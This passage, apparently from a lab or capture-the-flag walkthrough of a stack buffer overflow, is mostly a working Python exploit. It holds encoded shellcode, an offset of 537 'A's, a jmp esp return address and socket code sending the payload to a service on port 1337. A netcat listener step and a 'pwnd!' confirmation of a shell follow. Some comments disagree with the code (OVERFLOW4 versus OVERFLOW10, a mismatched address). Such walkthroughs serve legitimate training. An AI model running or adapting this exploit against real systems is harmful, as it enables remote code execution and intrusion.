shellcode += b"\xab\x31\xaf\x41\xee\x4c\xae\x4b\x70\xf5\xab"
shellcode += b"\x45\xd5\x9e\xe6\xf1\x02\x48\x9c\x29\xbd\x15"
shellcode += b"\xf4\x72\xf8\x66\xc6\x45\xdb\x7d\xb8\x6d\xa9"
shellcode += b"\x12\x0b\xcf\x37\x85\xf5\x1a\x8f\x3c\x30\x4e"
shellcode += b"\xdf\x7d\xdd\x9a\xe4\x15\x0b\xcf\xdf\x45\xa4"
shellcode += b"\x4a\xcf\x45\xb4\x4a\xe7\xff\xfb\xc5\x6f\xea"
shellcode += b"\x21\x8d\xe5\x10\x9c\x10\x84\x54\x0b\x72\x8d"
shellcode += b"\x15\xd7\x2b\x06\xf3\x9e\x0a\xd9\x42\x9c\x83"
shellcode += b"\x2a\x61\x95\xe5\x5a\x90\x34\x6e\x83\xea\xba"
shellcode += b"\x12\xfa\xf9\x9c\xea\x3a\xb7\xa2\xe5\x5a\x7d"
shellcode += b"\x97\x77\xeb\x15\x7d\xf9\xd8\x42\xa3\x2b\x79"
shellcode += b"\x7f\xe6\x43\xd9\xf7\x09\x7c\x48\x51\xd0\x26"
shellcode += b"\x8e\x14\x79\x5e\xab\x05\x32\x1a\xcb\x41\xa4"
shellcode += b"\x4c\xd9\x43\xb2\x4c\xc1\x43\xa2\x49\xd9\x7d"
shellcode += b"\x8d\xd6\xb0\x93\x0b\xcf\x06\xf5\xba\x4c\xc9"
shellcode += b"\xea\xc4\x72\x87\x92\xe9\x7a\x70\xc0\x4f\xfa"
shellcode += b"\x92\x3f\xfe\x72\x29\x80\x49\x87\x70\xc0\xc8"
shellcode += b"\x1c\xf3\x1f\x74\xe1\x6f\x60\xf1\xa1\xc8\x06"
shellcode += b"\x86\x75\xe5\x15\xa7\xe5\x5a"


```


35. Create python script for payload.py

```python
#!/usr/bin/env python3

import socket  # Import the socket library for network communication

# Target IP address and port where the vulnerable service is running
ip = 'target.local'
port = 1337

# Shellcode: This is the payload that will be executed on the target machine
# The shellcode is written in hexadecimal format representing machine instructions

shellcode =  ""
shellcode += "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += "\x5e\x81\x76\x0e\x15\xf4\x1a\x8f\x83\xee\xfc"
shellcode += "\xe2\xf4\xe9\x1c\x98\x8f\x15\xf4\x7a\x06\xf0"
shellcode += "\xc5\xda\xeb\x9e\xa4\x2a\x04\x47\xf8\x91\xdd"
shellcode += "\x01\x7f\x68\xa7\x1a\x43\x50\xa9\x24\x0b\xb6"
shellcode += "\xb3\x74\x88\x18\xa3\x35\x35\xd5\x82\x14\x33"
shellcode += "\xf8\x7d\x47\xa3\x91\xdd\x05\x7f\x50\xb3\x9e"
shellcode += "\xb8\x0b\xf7\xf6\xbc\x1b\x5e\x44\x7f\x43\xaf"
shellcode += "\x14\x27\x91\xc6\x0d\x17\x20\xc6\x9e\xc0\x91"
shellcode += "\x8e\xc3\xc5\xe5\x23\xd4\x3b\x17\x8e\xd2\xcc"
shellcode += "\xfa\xfa\xe3\xf7\x67\x77\x2e\x89\x3e\xfa\xf1"
shellcode += "\xac\x91\xd7\x31\xf5\xc9\xe9\x9e\xf8\x51\x04"
shellcode += "\x4d\xe8\x1b\x5c\x9e\xf0\x91\x8e\xc5\x7d\x5e"
shellcode += "\xab\x31\xaf\x41\xee\x4c\xae\x4b\x70\xf5\xab"
shellcode += "\x45\xd5\x9e\xe6\xf1\x02\x48\x9c\x29\xbd\x15"
shellcode += "\xf4\x72\xf8\x66\xc6\x45\xdb\x7d\xb8\x6d\xa9"
shellcode += "\x12\x0b\xcf\x37\x85\xf5\x1a\x8f\x3c\x30\x4e"
shellcode += "\xdf\x7d\xdd\x9a\xe4\x15\x0b\xcf\xdf\x45\xa4"
shellcode += "\x4a\xcf\x45\xb4\x4a\xe7\xff\xfb\xc5\x6f\xea"
shellcode += "\x21\x8d\xe5\x10\x9c\x10\x84\x54\x0b\x72\x8d"
shellcode += "\x15\xd7\x2b\x06\xf3\x9e\x0a\xd9\x42\x9c\x83"
shellcode += "\x2a\x61\x95\xe5\x5a\x90\x34\x6e\x83\xea\xba"
shellcode += "\x12\xfa\xf9\x9c\xea\x3a\xb7\xa2\xe5\x5a\x7d"
shellcode += "\x97\x77\xeb\x15\x7d\xf9\xd8\x42\xa3\x2b\x79"
shellcode += "\x7f\xe6\x43\xd9\xf7\x09\x7c\x48\x51\xd0\x26"
shellcode += "\x8e\x14\x79\x5e\xab\x05\x32\x1a\xcb\x41\xa4"
shellcode += "\x4c\xd9\x43\xb2\x4c\xc1\x43\xa2\x49\xd9\x7d"
shellcode += "\x8d\xd6\xb0\x93\x0b\xcf\x06\xf5\xba\x4c\xc9"
shellcode += "\xea\xc4\x72\x87\x92\xe9\x7a\x70\xc0\x4f\xfa"
shellcode += "\x92\x3f\xfe\x72\x29\x80\x49\x87\x70\xc0\xc8"
shellcode += "\x1c\xf3\x1f\x74\xe1\x6f\x60\xf1\xa1\xc8\x06"
shellcode += "\x86\x75\xe5\x15\xa7\xe5\x5a"

# Command to be sent to the target service. "OVERFLOW4 " is the vulnerable function or command.
Command = "OVERFLOW10 "

# Offset: Buffer of 'A's used to overflow the buffer until the return pointer
Offset = 537 * "A"  # Fills the stack up to the return address (control the EIP)

# jmp: Address of the instruction that redirects execution flow to our shellcode
# "\x03\x11\x50\x62" is the memory address that contains "jmp esp" or a similar instruction
jmp = "\xAF\x11\x50\x62"
    #ESP 625011AF

# NOP sled: Helps guide the execution smoothly into the shellcode by filling with NOP instructions
nops = 16 * "\x90"  # 16 NOP instructions (0x90 is a NOP in x86 architecture)

# Complete exploit string, combining all parts
string = Command + Offset + jmp + shellcode

try:
    # Creating a socket object for TCP communication
    with socket.socket() as s:
        # Attempt to connect to the target IP and port
        s.connect((ip, port))
        print("Sending exploit payload...")
        # Sending the crafted exploit payload
        s.send(bytes(string, 'latin-1'))
        
except Exception as e:
    # If an error occurs during connection or sending, print the error
    print("Failed to connect or send the payload:", e)


```


36. Run nc listener and execute payload

![800](img/Pasted%20image%2020240902181357.png)

![800](img/Pasted%20image%2020240902181406.png)


37. Verify connection, pwnd!

![](img/Pasted%20image%2020240905170502.png)

